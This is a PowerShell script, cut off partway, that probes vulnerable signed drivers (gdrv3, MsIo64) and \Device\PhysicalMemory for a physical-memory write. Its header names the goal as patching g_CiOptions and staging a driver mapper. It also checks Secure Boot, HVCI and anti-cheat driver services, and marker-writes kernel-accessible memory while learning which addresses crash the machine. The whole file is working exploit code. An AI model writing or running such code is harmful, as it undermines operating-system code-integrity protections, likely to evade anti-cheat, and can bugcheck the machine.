# ============================================================================
# p36_write.ps1 - BYOVD write-primitive probe + kernel discovery.
#
# QUESTION THIS ANSWERS (the last unknown in the gate):
#   gdrv3 gives a VERIFIED physical READ.  Where does the physical WRITE come
#   from - because without a write there is no g_CiOptions patch, no image
#   staging and no mapper.
#
# CANDIDATES, tried in order, nothing else changed:
#   W1 \Device\PhysicalMemory  elevated + SeLockMemoryPrivilege (native)
#   W2 MsIo64 0x80102040 map into our process (driver-mediated view, RW)
#   W3 gdrv3 0xC3502004 / 0xC3502808 (completeness)
# Then read-only discovery: ntoskrnl phys, CR3 via PML4 self-map, VA->PA walk,
# nt!g_CiOptions pattern.  Only the W1/W2 marker test writes, and it restores.
#
# Pass criterion: at least one of W1/W2 returns a view whose bytes match the
# gdrv3 read of the same PA AND a marker written there is visible through the
# independent gdrv3 path and restores cleanly.  X1+X2+X3 must also land.
# Run via p36_task.ps1 (elevated, survives the tool terminal).
# ============================================================================
$ErrorActionPreference = 'Continue'
$OUT = Join-Path $PSScriptRoot 'p36_write.txt'
$CS  = Join-Path $PSScriptRoot 'p36_prov.cs'
$MARK = [byte[]](0xE0,0xCE,0xF1,0x0F,0xED,0xAC,0xEF,0x0D)   # 0x0DEFACED0FF1CE0

$script:L = New-Object System.Collections.ArrayList
# Crash-durable log.  This matters: a bugcheck does NOT flush the file cache, so plain
# Add-Content loses the last ~1-2 s of lines - which is exactly the window the crash
# lands in (22:31 dump: crash at 22:31:19, last line written 22:31:17).  Open with
# WriteThrough and flush per line, so the tail always survives on disk.
$script:logSw = $null
function OpenLog {
    if ($script:logSw -ne $null) { return }
    $fs = New-Object System.IO.FileStream($OUT, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
    $script:logSw = New-Object System.IO.StreamWriter($fs, (New-Object System.Text.UTF8Encoding($false)))
    $script:logSw.AutoFlush = $true
}
function Log([string]$s) {
    $script:L.Add($s) | Out-Null
    try { OpenLog; $script:logSw.WriteLine($s) } catch { Add-Content -LiteralPath $OUT -Value $s -Encoding UTF8 }
    Write-Host $s
}

$mtx = New-Object System.Threading.Mutex($false, 'Global\QwenKern_p36')
if (-not $mtx.WaitOne(0)) { Write-Host 'p36 already running'; exit 0 }

# keep the previous run's FULL log before this line resets $OUT: the BADPA learner
# below needs to know whether THAT run reached '-- p36 END' or died mid-scan.
# (02:11 post-mortem: reading the already-reset $OUT could never see END, so a
# completed run was misread as dead every time.)
$prevOut = Join-Path $PSScriptRoot 'p36_write_prev.txt'
if (Test-Path -LiteralPath $OUT) { Copy-Item -LiteralPath $OUT -Destination $prevOut -Force -EA 0 }
Set-Content -LiteralPath $OUT -Value ("=== p36 BYOVD WRITE-PRIMITIVE PROBE {0} ===" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
$adm = [bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
Log ("  admin={0}  pid={1}  host={2}" -f $adm, $PID, $env:COMPUTERNAME)
if (-not $adm) { Log '  !! NOT ELEVATED - device DACL will deny; re-run via p36_task.ps1' }

# ---- environment -----------------------------------------------------------
# Hang-proofed on purpose: two earlier runs (21:54 and 22:21) froze solid one
# line into this block, right at the bare Get-CimInstance calls, while the very
# same calls take ~150ms in an unelevated console.  So (1) a breadcrumb is
# logged BEFORE every risky call, and (2) no WMI sits on the critical path:
# os/cpu/DeviceGuard come from the registry and every CIM query runs inside a
# bounded job that gets killed if it misses its deadline.
function Br([string]$s) { Log ('  ... ' + $s) }

Br 'env: registry baseline'
$osCap = ''; $osBld = ''; $cpuName = ''
try {
    $k = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -EA 0
    $osCap = [string]$k.ProductName
    $osBld = ('{0}.{1}' -f $k.CurrentBuild, $k.UBR)
    $cpuName = [string](Get-ItemProperty 'HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0' -EA 0).ProcessorNameString
} catch { $osCap = 'regread-failed: ' + $_.Exception.Message }
$os  = [pscustomobject]@{ Caption = $osCap; BuildNumber = $osBld }
$cpu = [pscustomobject]@{ Name = $cpuName }
Log ("  os={0} build={1}  cpu={2}" -f $os.Caption, $os.BuildNumber, $cpu.Name)

Br 'env: SecureBoot'
try { $sb = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State' -EA 0).UEFISecureBootEnabled } catch { $sb = 'EXC' }
Log ("  SecureBoot={0}" -f $sb)

Br 'env: SystemStartOptions'
try { $sso = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control' -EA 0).SystemStartOptions } catch { $sso = 'EXC' }
Log ("  SystemStartOptions=[{0}]" -f $sso)

Br 'env: bcdedit.exe'
try { $ts = ((& bcdedit.exe /enum '{current}' 2>&1 | Select-String 'testsigning|hypervisorlaunchtype|nointegritychecks|vsm ') -join ' ; ') } catch { $ts = 'EXC ' + $_.Exception.Message }
Log ("  bcdedit: {0}" -f $ts)

Br 'env: DeviceGuard (registry)'
try {
    $dgr = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -EA 0
    $hvci = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity' -EA 0).Enabled
    Log ("  DeviceGuard(reg): VBS={0} servicesRunning={1} HVCI={2} lock={3}" -f $dgr.EnableVirtualizationBasedSecurity, ($dgr.RequirementSecurityServicesRunning -join ','), $hvci, $dgr.Lock)
} catch { Log ('  DeviceGuard(reg): ' + $_.Exception.Message) }

Br 'env: CIM (bounded job, 20s deadline)'
$ci = $null
try {
    $jb = Start-Job -ScriptBlock {
        $a = Get-CimInstance Win32_OperatingSystem -EA 0
        $b = Get-CimInstance Win32_Processor -EA 0 | Select-Object -First 1
        $c = Get-CimInstance Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -EA 0
        [pscustomobject]@{ cap = $a.Caption; bld = $a.BuildNumber; ver = $a.Version; cpu = $b.Name
                           vbs = $c.VirtualizationBasedSecurityStatus; svc = ($c.SecurityServicesRunning -join ',') }
    }
    if (Wait-Job $jb -Timeout 20) { $ci = Receive-Job $jb } else { Stop-Job $jb -EA 0 }
    Remove-Job $jb -Force -EA 0
} catch { Log ('  CIM EXC: ' + $_.Exception.Message) }
if ($ci) { Log ("  cim: os={0} build={1}.{2} cpu={3} VBS={4} services={5}" -f $ci.cap, $ci.bld, $ci.ver, $ci.cpu, $ci.vbs, $ci.svc) }
else { Log '  cim: DEADLINE MISSED / unavailable -> registry values above stand alone' }

Br 'env: driver services (sc.exe)'
foreach ($s in 'gdrv3','MsIo','apexdrv','eaanticheat','EAAntiCheatService') {
    try { $r = ((& sc.exe query $s 2>&1) -join ' ') } catch { $r = '' }
    if ($r -match 'SERVICE_NAME') { Log ("  svc {0,-20} {1}" -f $s, (($r -replace '\s+',' ') -replace '.*STATE\s*:\s*','STATE ')) } else { Log ("  svc {0,-20} ABSENT" -f $s) }
}
Br 'env: done'

# ---- load the C# helper ----------------------------------------------------
try {
    Add-Type -Path $CS -ErrorAction Stop
    Log '  [cs] p36_prov.cs compiled'
} catch {
    Log ("  [cs] COMPILE FAILED: {0}" -f $_.Exception.Message)
    Log '  [cs] (see p36_write.txt tail; aborting)'
    '-- p36 ABORT (compile) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
    exit 1
}

# ---- crash-learned bad-PA blacklist -----------------------------------------
# A run that dies inside gdrv3 leaves a durable breadcrumb whose LAST line names the
# PA that killed the box.  Fold that PA into p36_badpa.txt and skip it from now on, so
# the scan walks past the hole instead of dying there on every single run.  Repeat:
# each crash teaches one more hole, and the run gets further every time.
$badPath = Join-Path $PSScriptRoot 'p36_badpa.txt'
$prevIo  = Join-Path $PSScriptRoot 'p36_io_prev.txt'
$bad = New-Object System.Collections.ArrayList
if (Test-Path -LiteralPath $badPath) {
    foreach ($ln in @(Get-Content -LiteralPath $badPath -EA 0)) {
        if ($ln -match '^\s*[0-9a-f]+\s*-\s*[0-9a-f]+\s*$') { $bad.Add($ln.Trim()) | Out-Null }
    }
}
$learned = ''
# io breadcrumb + PREVIOUS run's io tail, kept BEFORE learning from it: the learner
# must see the PA the LAST run died on.  (02:11 post-mortem: this copy used to run
# AFTER the learner, so learning always saw a two-runs-stale tail - the 02:00:26 run
# died at pa=0x800000 and nothing was ever learned from it.)
$ioPath = Join-Path $PSScriptRoot 'p36_io.txt'
if (Test-Path -LiteralPath $ioPath) { Copy-Item -LiteralPath $ioPath -Destination $prevIo -Force -EA 0 }
if ((Test-Path -LiteralPath $prevIo) -and (Test-Path -LiteralPath $prevOut)) {
    # END/ABORT comes from the PREVIOUS run's log (saved above, before $OUT was
    # reset) - never from $OUT itself, which by now holds only this run's header.
    $prevLog = (Get-Content -LiteralPath $prevOut -EA 0) -join "`n"
    if ($prevLog -notmatch '-- p36 (END|ABORT)') {
        $lines = @(Get-Content -LiteralPath $prevIo -EA 0)
        for ($i = $lines.Count - 1; $i -ge 0; $i--) {
            if ($lines[$i] -match 'read pa=0x([0-9a-f]+) size=0x([0-9a-f]+)') {
                $kpa = [Convert]::ToUInt64($matches[1], 16)
                # blacklist the enclosing 2 MiB, not just the 4 bytes that died:
                # the hole is at least a page, the 02:00:26 killer 0x800000 is
                # 2 MiB-aligned, and a 1 MiB sweep step inside the same hole
                # would otherwise bugcheck the box one PA at a time.
                $kp = (([uint64]$kpa) -shr 21) -shl 21
                $learned = ('{0:x}-{1:x}' -f $kp, ($kp + 0x200000))
                break
            }
        }
    }
}
if (($learned -ne '') -and -not $bad.Contains($learned)) {
    $bad.Add($learned) | Out-Null
    (@($bad) | Select-Object -Last 64) | Set-Content -LiteralPath $badPath -Encoding ascii
    Log ("  BADPA: previous run died, blacklisting the PA it died on: {0}" -f $learned)
} elseif ($bad.Count -gt 0) { Log ("  BADPA: {0} previously-learned range(s) loaded" -f $bad.Count) }
[P36Prov]::SetBadRanges(($bad -join ','))

$ramTop = [P36Prov]::RamTop()
Log ("  ramTop=0x{0:x} ({1} GB)" -f $ramTop, [math]::Round($ramTop/1GB,1))

# ---- RAM truth table -------------------------------------------------------
# gdrv3 maps a PA with NO backing-RAM validation.  "PA < ramTop" is not a RAM
# test: on a 32 GB box the PCI/MMIO hole sits BELOW ramTop, and a hole read avs
# gdrv3 -> bugcheck 0x3B.  Proven twice on the host (01/11 21:54, 27/10 23:50).
$ramRanges = ''
try {
    $k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('HARDWARE\RESOURCEMAP\System Resources\Physical Memory')
    $rb = $k.GetValue('.Translated'); $k.Close()
    if ($rb -and $rb.Length -ge 16) {
        $off = 4; $cnt = [BitConverter]::ToUInt32($rb, 0); $parts = New-Object System.Collections.ArrayList
        for ($l = 0; $l -lt $cnt; $l++) {
            if ($off + 16 -gt $rb.Length) { break }
            $off += 12; $n = [BitConverter]::ToUInt32($rb, $off); $off += 4
            for ($d = 0; $d -lt $n; $d++) {
                if ($off + 16 -gt $rb.Length) { break }
                $type = $rb[$off]; $st = [BitConverter]::ToUInt64($rb, $off + 4)
                $ln = [BitConverter]::ToUInt32($rb, $off + 12); $off += 16
                if ($type -eq 3 -and $ln -gt 0) { $parts.Add(('{0:x}-{1:x}' -f $st, ($st + $ln))) | Out-Null }
            }
        }
        $ramRanges = ($parts -join ',')
    }
} catch { }
if ($ramRanges -eq '') {
    # .NET could not read the REG_RESOURCE_LIST (GetValue -> NULL), which is exactly why
    # this was empty on 01/11 and the hole filter silently degenerated to pa<ramTop.
    try { $ramRanges = [P36Prov]::RamRangesFromRegistry() } catch { $ramRanges = 'native-exc: ' + $_.Exception.Message }
    Log ("  ramRanges(native RegQueryValueEx) = {0}" -f $ramRanges)
    if ($ramRanges -match '^(open|query|read|short|no-memory|native-exc)') { $ramRanges = '' }
}
if ($ramRanges -eq '') { Log '  !! RAM map EMPTY - fallback pa<ramTop + BADPA blacklist (hole PAs can still bugcheck)' }
else { Log ("  ramRanges = {0}" -f $ramRanges) }
[P36Prov]::SetRamRanges($ramRanges, $ramTop)

# per-IOCTL breadcrumb in its own file: it must survive a bugcheck, and the scan
# issues ~16k reads so the main log would be too slow.  (Preserving the previous
# run's tail now happens up in the BADPA block, BEFORE learning from it.)
Set-Content -LiteralPath $ioPath -Value ("# io breadcrumb {0}" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
# WriteThrough again - the StreamWriter's own buffer would otherwise die with the box,
# and this is the file whose last line is the crash's exact address.
$ioFs = New-Object System.IO.FileStream($ioPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
$script:ioSw = New-Object System.IO.StreamWriter($ioFs, (New-Object System.Text.UTF8Encoding($false)))
$script:ioSw.AutoFlush = $true
try { [P36Prov]::Notify = [P36Prov+Note] { param([string]$s) $script:ioSw.WriteLine($s) } }
catch { Log ('  !! Notify hook failed: ' + $_.Exception.Message) }

$ref0 = New-Object byte[] 32

# ---- G0: the one verified read primitive ----------------------------------
$g = [IntPtr]::Zero
$err = [P36Prov]::GdrvOpen([ref]$g)
if ($err -ne '') { Log ("  G0 \\.\GIOV3 FAIL {0}" -f $err) } else {
    Log ("  G0 \\.\GIOV3 open ok handle=0x{0:x}" -f $g.ToInt64())
    $ref0 = [P36Prov]::GdrvRead($g, [uint64]0x1000, 32)
    Log ("  G0 read phys 0x1000 = {0}" -f ([P36Prov]::Hex($ref0)))
    Log ("  G0 read phys 0x2000 = {0}" -f ([P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x2000, 16))))
}

$verdict = [ordered]@{ W1_physmem = $false; W2_msio = $false; W3_gdrv = $false; X_cr3 = $false; X_ntos = $false; X_ci = $false }
$ciTargetVa = [uint64]0; $ciValue = [uint32]0
$ntPhys = [uint64]0; $ntSize = [uint32]0; $cr3 = [uint64]0; $ntVa = [uint64]0
# ---- W1: \Device\PhysicalMemory --------------------------------------------
Log ''
Log '########## W1 \Device\PhysicalMemory (native, elevated, SeLockMemoryPrivilege) ##########'
$sec = [IntPtr]::Zero
$wi = [Security.Principal.WindowsIdentity]::GetCurrent()
Log ("  identity={0} isSystem={1}" -f $wi.Name, $wi.IsSystem)
$pv2 = (whoami /priv | Select-String 'Lock pages|Tcb|Debug')
Log ('  privdump: ' + (($pv2 | ForEach-Object { $_.Line.Trim() }) -join ' | '))


foreach ($mask in [uint32]0xF001F, [uint32]0x6, [uint32]0x4, [uint32]0x2, [uint32]0x1) {
    $pv = ''
    Log ("  {0}   SeLockMemoryPrivilege={1}" -f ([P36Prov]::PhysMemOpenMask($mask, [ref]$sec, [ref]$pv)), $pv)
    if ($sec -ne [IntPtr]::Zero) { Log '  (opened - proceeding with the marker test on this handle)' ; break }
}
if ($sec -eq [IntPtr]::Zero) {
    foreach ($am in [uint32]0x6, [uint32]0x1) {
        $pva = ''
        $ra2 = [P36Prov]::PhysMemOpenNamed('\??\PhysicalMemory', $am, [ref]$sec, [ref]$pva)
        Log ("  alias \??\PhysicalMemory {0} priv={1}" -f $ra2, $pva)
        if ($sec -ne [IntPtr]::Zero) { Log '  (opened via alias)' ; break }
    }
}
if ($sec -ne [IntPtr]::Zero) {
    $view = [IntPtr]::Zero; $vs = [int64]0


    $e = [P36Prov]::PhysMemMap($sec, [uint64]0x1000, 0x1000, $false, [ref]$view, [ref]$vs)
    if ($e -eq '') {
        $vva = [uint64]$view.ToInt64()
        Log ("  map pa=0x1000 -> view=0x{0:x} viewSize=0x{1:x}" -f $vva, $vs)
        $a = [P36Prov]::ReadAt($vva, 16)
        $b = [P36Prov]::Hex($ref0[0..15])
        Log ("  view[0:16] = {0}" -f $a)
        Log ("  gdrv[0:16] = {0}" -f $b)
        $readOk = ($a -ne $null -and $a -eq $b)
        Log ("  W1 read-coherent = {0}" -f $readOk)
        $orig = [P36Prov]::ReadAt(($vva + 0x10), 8)
        $wr = [P36Prov]::WriteAt(($vva + 0x10), $MARK)
        $viaGdrv = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
        $markHex = [P36Prov]::Hex($MARK)
        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
        $restored = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
        Log ("  marker orig={0} wrote={1} via_gdrv={2} restored={3}" -f $orig, $markHex, $viaGdrv, $restored)
        $writeOk = ($viaGdrv -eq $markHex) -and ($restored -eq $orig)
        Log ("  W1 write-coherent+restored = {0}" -f $writeOk)
        $t0 = Get-Date
        for ($i = 0; $i -lt 200; $i++) { [P36Prov]::WriteAt(($vva + 0x10), $MARK) | Out-Null }
        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
        Log ("  W1 200 view writes = {0:N0} ms ({1:N0} us/op)" -f ((Get-Date) - $t0).TotalMilliseconds, (((Get-Date) - $t0).TotalMilliseconds * 1000 / 200))
        $verdict.W1_physmem = ($readOk -and $writeOk)
        if ($verdict.W1_physmem) { Log '  W1 PASS - native physical R/W view held open' }
        else { Log ("  W1 FAIL - unmap={0}" -f ([P36Prov]::PhysMemUnmap($sec, $view))) }
    } else { Log ("  map FAIL: {0}" -f $e) }
} else { Log '  W1 no section handle' }

# ---- W2: MsIo64 map ------------------------------------------------------
Log ''
Log '########## W2 MsIo64 0x80102040 (fallback driver-mediated view) ##########'
$mio = [IntPtr]::Zero
$me2 = [P36Prov]::MsIoOpen([ref]$mio)
if ($me2 -ne '') { Log ("  open \\.\MSIO FAIL {0}" -f $me2) } else {
    Log ("  open \\.\MSIO ok handle=0x{0:x}" -f $mio.ToInt64())
    $ref4 = [P36Prov]::Hex($ref0[0..15])
    foreach ($shape in 0,1,2,3) {
        $err2 = [uint32]0; $oh = ''
        $st = [P36Prov]::MsIoTry($mio, $shape, [uint64]0x1000, 0x1000, [ref]$err2, [ref]$oh)
        Log ("  {0}" -f $st)
        if ($st -match ' OK') {
            Log ("    out={0}" -f $oh)
            $q = $oh -split ' '
            for ($k = 0; $k -lt 8; $k++) {
                $v = [uint64]::Parse(($q[($k*8)..($k*8+7)] -join ''), 'HexNumber')
                if ([P36Prov]::IsUserVa($v)) {
                    $sample = [P36Prov]::ReadAt($v, 16)
                    Log ("    q[{0}]=0x{1:x} deref={2} match={3}" -f $k, $v, $sample, ($sample -eq $ref4))
                    if ($sample -eq $ref4 -and -not $verdict.W2_msio) {
                        $verdict.W2_msio = $true
                        Log ("    W2 PASS - user view at 0x{0:x} maps pa=0x1000; marker test:" -f $v)
                        $o2 = [P36Prov]::ReadAt($v, 8)
                        [P36Prov]::WriteAt($v, $MARK) | Out-Null
                        $back = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
                        [P36Prov]::WriteAt($v, [byte[]]($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
                        $res = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
                        Log ("    orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, ([P36Prov]::Hex($MARK)), $back, $res)
                        if ($back -ne ([P36Prov]::Hex($MARK)) -or $res -ne $o2) { $verdict.W2_msio = $false; Log '    W2 marker NOT coherent' }
                    }
                }
            }
        }
        if ($verdict.W2_msio) { break }
    }
    # REVISED-2 shape, from the full worker-0x1090 RE (temp\drv\annot_MsIo64.txt):
    #   in = { q0 = len (driver caps at 4), q1 = user VA whose low32 == the PA to map,
    #          q2/q3/q4 = 0 in -> section handle / view base in OUR process / object out }.
    #   The driver opens \Device\PhysicalMemory KERNEL-side (Zw, PreviousMode=kernel),
    #   so the usermode DACL that kills W1 does not apply; the view lands in our own
    #   process at SectionOffset=low32(q1), ViewSize=min(q0,4), RW+NOCACHE.
    #   Worker 0x10aa range-checks low32(q1) in [G, G+0x10000000) of a driver global
    #   (unknown statically) -> outside = err 5.  Sweep PAs; the OK-vs-err5 pattern
    #   reveals the window, and in-window RAM PAs get the full marker test.
    # NB: every literal here carries the L suffix.  Bare 0x80000000+ literals parse
    # as NEGATIVE Int32 in PowerShell (-2147483648) and [uint64] on a negative throws
    # InvalidCast at foreach-collection evaluation - which silently aborts the whole
    # loop BEFORE iteration 1 (the 02:00 and 12:09/12:17 zero-line mystery).
    # G probe: 4086 PAs under 4 GB were err=5 uniformly, so the driver's window sits
    # ABOVE 4 GB.  q1 must be a user VA whose low32 is still the PA (SectionOffset =
    # low32(q1)), so the VA base must be >= 4 GB and the VA must land in
    # [G, G+0x10000000).  Probe candidate bases with a known-RAM PA and take the
    # first that stops returning err=5.
    $gw = [uint64]0
    foreach ($b in [uint64]0x100000000L, [uint64]0x108000000L, [uint64]0x110000000L,
                       [uint64]0x180000000L, [uint64]0x200000000L, [uint64]0x800000000L) {
        $qb = [IntPtr]::Zero; $eb2 = [uint32]0; $vb0 = [uint64]0; $hb = [uint64]0; $ob = [uint64]0
        $rab = [P36Prov]::MsIoRegionAt($b, [uint64]0x100000L, [ref]$qb)
        if ($rab -ne '') { Log ("  base probe 0x{0:x} ALLOC-FAIL" -f $b); continue }
        $sb = [P36Prov]::MsIoMapTry4($mio, [uint64]$qb.ToInt64(), 4, [ref]$eb2, [ref]$vb0, [ref]$hb, [ref]$ob)
        Log ("  base probe va=0x{0:x} q1=0x{1:x} -> {2}" -f $b, $qb.ToInt64(), $sb)
        if ($hb -ne 0) { [P36Prov]::MsIoUnmapTry($mio, 4, [uint64]$qb.ToInt64(), $hb, $vb0, $ob, [ref]$eb2) | Out-Null }
        [P36Prov]::MsIoRegionFree($qb)
        if ($sb -notmatch 'err=5') { $gw = $b; break }
    }
    Log ("  G base = 0x{0:x}" -f $gw)
    # sweep the 256 MB window at 1 MB resolution (pa 0..0x10000000 - all that can fit
    # inside a 256 MB window while low32(q1) still equals the PA)
    $pas = New-Object System.Collections.Generic.List[uint64]
    if ($gw -ne 0) { for ($v = 0L; $v -lt 0x10000000L; $v += 0x100000L) { $pas.Add([uint64]$v) } }
    foreach ($pa in $pas) {
        # 02:11 post-mortem: the 02:00:26 run logged ZERO try3 lines although this loop
        # is unconditional - something threw before the first Log and the whole foreach
        # was silently skipped.  Catch per-PA so one bad call neither eats the loop
        # nor stays invisible: the exception text lands in p36_write.txt.
        # keep the VirtualAlloc region alive across map AND unmap: the 0x80102044
        # unmap handler re-probes q1 (ProbeForRead/Write(q1,q0,4)) - freeing it
        # between the two IOCTLs was the err=998 trap (MsIoMapTry3 freed it in
        # its own finally).  Span: RegionAlloc -> MapTry4 -> verify -> UnmapTry
        # -> RegionFree.
        Log ("  try3 pa=0x{0:x} ENTER" -f $pa)
        $e5 = [uint32]0; $vb = [uint64]0; $o2h = [uint64]0; $o4o = [uint64]0; $reg = [IntPtr]::Zero
        $ra = [P36Prov]::MsIoRegionAt($gw, $pa, [ref]$reg)
        if ($ra -ne '') { Log ("  try3 pa=0x{0:x} REGION-ALLOC {1}" -f $pa, $ra); continue }
        try {
        $st3 = [P36Prov]::MsIoMapTry4($mio, [uint64]$reg.ToInt64(), 4, [ref]$e5, [ref]$vb, [ref]$o2h, [ref]$o4o)
        Log ("  try3 {0}  view=0x{1:x} h=0x{2:x} obj=0x{3:x}" -f $st3, $vb, $o2h, $o4o)
        if ($vb -ne 0 -and [P36Prov]::InRam($pa)) {
            $gref = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
            $vs   = [P36Prov]::ReadAt($vb, 4)
            Log ("    view[0:4]={0} gdrv[0:4]={1} match={2}" -f $vs, $gref, ($vs -eq $gref))
            if ($vs -eq $gref) {
                $m4 = [byte[]]($MARK[0..3]); $mh = [P36Prov]::Hex($m4)
                $o2 = $vs
                [P36Prov]::WriteAt($vb, $m4) | Out-Null
                $bk = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
                [byte[]]$orig = ($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })
                [P36Prov]::WriteAt($vb, $orig) | Out-Null
                $rs = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
                Log ("    marker orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, $mh, $bk, $rs)
                if ($bk -eq $mh -and $rs -eq $o2) {
                    $verdict.W2_msio = $true
                    Log ("    W2 PASS - MsIo view maps pa=0x{0:x} (G-window covers it)" -f $pa)
                } else { Log '    W2 marker NOT coherent' }
            }
        } elseif ($vb -ne 0) {
            Log '    (non-RAM PA in G-window - view mapped, gdrv compare skipped)'
        }
        if ($o2h -ne 0) {
            # unmap runs for EVERY map that got a section handle (o2h != 0) -
            # including map-failed-after-open (out2=handle/out4=object are set
            # before the view, out3=0 is a safe no-op for ZwUnmapViewOfSection) -
            # so no view/handle/object leaks per swept PA.  The region is still
            # alive here, so the unmap handler's q1 probe passes.
            $um = [P36Prov]::MsIoUnmapTry($mio, 4, [uint64]$reg.ToInt64(), $o2h, $vb, $o4o, [ref]$e5)
            Log ("    unmap: {0}" -f $um)
        }
        } catch {
            Log ("  try3 pa=0x{0:x} EXCEPTION: {1}" -f $pa, $_.Exception.Message)
        } finally {
            [P36Prov]::MsIoRegionFree($reg)
        }
        if ($verdict.W2_msio) { break }
    }
    Log '  try3 loop done'
    [P36Prov]::CloseHandle2($mio) | Out-Null
}

# ---- W3: gdrv3 own map / copy -------------------------------------------
Log ''
Log '########## W3 gdrv3 0xC3502004 map / 0xC3502808 copy-user->phys ##########'
if ($g -ne [IntPtr]::Zero) {
    # 0x2d14 checks 'request fully inside ONE node of the driver's range list'
    # BEFORE mapping (MmMapIoSpace comes later), so wrong PAs are safe to probe.
    # Sweep RAM points and the MMIO hole band where a GPU BAR would sit; the first
    # accepted PA gets the full coherence/marker test.
    foreach ($mpa in [uint64]0x1000L, [uint64]0x100000L, [uint64]0x1000000L, [uint64]0x10000000L,
                       [uint64]0x20000000L, [uint64]0x30000000L, [uint64]0x32000000L, [uint64]0x40000000L,
                       [uint64]0xC0000000L, [uint64]0xE0000000L, [uint64]0xF0000000L, [uint64]0xF8000000L,
                       [uint64]0xFB000000L, [uint64]0xFC000000L, [uint64]0xFD000000L, [uint64]0xFE000000L,
                       [uint64]0x100000000L, [uint64]0x180000000L) {
        $va = [uint64]0; $e3 = [uint32]0
        $sm = [P36Prov]::GdrvMapTry($g, $mpa, [uint64]0x1000, [ref]$va, [ref]$e3)
        Log ("  0xC3502004 map pa=0x{0:x}: {1}" -f $mpa, $sm)
        if ($va -eq 0) { continue }
        $inRam = [P36Prov]::InRam($mpa)
        Log ("    W3 inRam={0}" -f $inRam)
        try {
            $a3 = [P36Prov]::ReadAt($va, 16)
            Log ("    W3 view[0:16]={0}" -f $a3)
            if ($inRam) {
                $b3 = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $mpa, 16))
                Log ("    W3 gdrv[0:16]={0}" -f $b3)
                Log ("    W3 read-coherent={0}" -f ($a3 -eq $b3))
                if ($a3 -ne $b3) { break }
            }
            # marker round-trip THROUGH the view, 4 bytes (MMIO registers are 32-bit
            # lanes here - an 8-byte write only lands the low dword); cross-checked
            # against gdrv on RAM
            $m4 = [byte[]]($MARK[0..3]); $mh3 = [P36Prov]::Hex($m4)
            $o3 = [P36Prov]::ReadAt(($va + 0x10), 4)
            [P36Prov]::WriteAt(($va + 0x10), $m4) | Out-Null
            $rv = [P36Prov]::ReadAt(($va + 0x10), 4)
            if ($inRam) { $bk3 = [P36Prov]::Hex([P36Prov]::GdrvRead($g, ($mpa + 0x10), 4)) } else { $bk3 = 'n/a(MMIO)' }
            [P36Prov]::WriteAt(($va + 0x10), [byte[]]($o3 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
            $rs3 = [P36Prov]::ReadAt(($va + 0x10), 4)
            Log ("    W3 marker orig={0} wrote={1} bounce={2} via_gdrv={3} restored={4}" -f $o3, $mh3, $rv, $bk3, $rs3)
            $ok3 = ($rv -eq $mh3) -and ($rs3 -eq $o3)
            if ($inRam) { $ok3 = $ok3 -and ($bk3 -eq $mh3) }
            if ($ok3) { $verdict.W3_gdrv = $true; Log '    W3 PASS - gdrv3 map view is coherent R/W' }
        } catch { Log ("    W3 view EXCEPTION: {0}" -f $_.Exception.Message) }
        break
    }
    Log ("  0xC3502808 in{{b,a,n}} a=0x1000: {0}" -f ([P36Prov]::GdrvCopyTry($g, [uint64]0x1000, [uint64]0x2000, 8, [ref]$e3)))
}
# ---- X: discovery (read-only) -------------------------------------------
Log ''
Log '########## X discovery (read-only, gdrv3 read only) ##########'
if ($g -ne [IntPtr]::Zero) {
    # read limits FIRST - run 1 died in here without saying why
    try {
        $rep0 = ''
        Log ("  ladder read 0x100000 okCount={0}" -f ([P36Prov]::SizeLadder($g, [uint64]0x100000, [ref]$rep0)))
        foreach ($ln in ($rep0 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    } catch { Log ("  ladder EXCEPTION: {0}" -f $_.Exception.Message) }
    try {
        $rep1 = ''
        Log ("  sweep 0x100000..0x40000000 step 0x100000 okCount={0}" -f ([P36Prov]::SweepRead($g, [uint64]0x100000, [uint64]0x40000000, [uint64]0x100000, [ref]$rep1)))
        foreach ($ln in ($rep1 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    } catch { Log ("  sweep EXCEPTION: {0}" -f $_.Exception.Message) }

    $hits = ''
